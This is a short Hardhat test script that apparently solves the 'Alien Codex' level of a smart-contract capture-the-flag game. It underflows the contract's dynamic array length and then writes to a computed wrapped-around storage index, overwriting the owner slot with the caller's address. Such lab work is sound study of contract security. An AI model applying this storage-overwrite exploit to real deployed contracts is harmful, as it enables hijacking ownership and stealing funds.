import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { txConfirmation } from "./utils";

describe("Alien Codex Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "19", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      await txConfirmation(challenge.makeContact());
      await txConfirmation(challenge.retract());
      await txConfirmation(challenge.revise(
        ethers.constants.MaxUint256.
          add(1).
          sub(ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.zeroPad("0x01", 32)))),
        ethers.utils.zeroPad(eoa.address, 32)))
  }}));
});
